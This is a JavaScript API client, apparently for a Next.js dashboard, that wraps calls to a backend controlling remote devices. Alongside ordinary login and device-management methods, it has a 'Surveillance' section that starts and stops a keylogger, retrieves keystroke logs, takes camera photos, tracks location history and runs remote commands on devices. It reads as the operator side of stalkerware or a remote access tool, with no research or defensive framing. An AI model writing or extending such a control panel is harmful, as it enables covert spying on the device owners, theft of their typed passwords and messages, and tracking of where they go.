const API_URL = process.env.NEXT_PUBLIC_API_URL;

class ApiClient {
  constructor() {
    this.baseURL = API_URL;
  }

  async request(endpoint, options = {}) {
    const url = `${this.baseURL}${endpoint}`;
    const token = localStorage.getItem('token');
    
    const headers = {
      'Content-Type': 'application/json',
      ...options.headers,
    };
    
    if (token) {
      headers['Authorization'] = `Bearer ${token}`;
    }
    
    const config = {
      ...options,
      headers,
    };
    
    try {
      const response = await fetch(url, config);
      const data = await response.json();
      
      if (!response.ok) {
        throw new Error(data.error || 'API request failed');
      }
      
      return data;
    } catch (error) {
      console.error('API Error:', error);
      throw error;
    }
  }
  
  get(endpoint, options = {}) {
    return this.request(endpoint, { ...options, method: 'GET' });
  }
  
  post(endpoint, body, options = {}) {
    return this.request(endpoint, {
      ...options,
      method: 'POST',
      body: JSON.stringify(body),
    });
  }
  
  put(endpoint, body, options = {}) {
    return this.request(endpoint, {
      ...options,
      method: 'PUT',
      body: JSON.stringify(body),
    });
  }
  
  delete(endpoint, options = {}) {
    return this.request(endpoint, { ...options, method: 'DELETE' });
  }
  
  // Device endpoints
  getDevices(params = {}) {
    const query = new URLSearchParams(params).toString();
    return this.get(`/devices${query ? `?${query}` : ''}`);
  }
  
  getDevice(deviceId) {
    return this.get(`/devices/${deviceId}`);
  }
  
  updateDevice(deviceId, data) {
    return this.put(`/devices/${deviceId}`, data);
  }
  
  deleteDevice(deviceId) {
    return this.delete(`/devices/${deviceId}`);
  }
  
  executeCommand(deviceId, command, params) {
    return this.post(`/devices/${deviceId}/commands`, { command, params });
  }
  
  // Auth endpoints
  login(email, password) {
    return this.post('/auth/login', { email, password });
  }
  
  register(name, email, password) {
    return this.post('/auth/register', { name, email, password });
  }
  
  logout() {
    return this.post('/auth/logout');
  }
  
  getMe() {
    return this.get('/auth/me');
  }
  
  // Surveillance endpoints
  startKeylogger(deviceId) {
    return this.post(`/surveillance/${deviceId}/keylogger/start`);
  }
  
  stopKeylogger(deviceId) {
    return this.post(`/surveillance/${deviceId}/keylogger/stop`);
  }
  
  getKeylogs(deviceId, params = {}) {
    const query = new URLSearchParams(params).toString();
    return this.get(`/surveillance/${deviceId}/keylogger/logs${query ? `?${query}` : ''}`);
  }
  
  takePhoto(deviceId, camera = 'back') {
    return this.post(`/surveillance/${deviceId}/camera/photo`, { camera });
  }
  
  getLocation(deviceId) {
    return this.get(`/location/${deviceId}`);
  }
  
  getLocationHistory(deviceId, params = {}) {
    const query = new URLSearchParams(params).toString();
    return this.get(`/location/${deviceId}/history${query ? `?${query}` : ''}`);
  }
}

export const apiClient = new ApiClient();
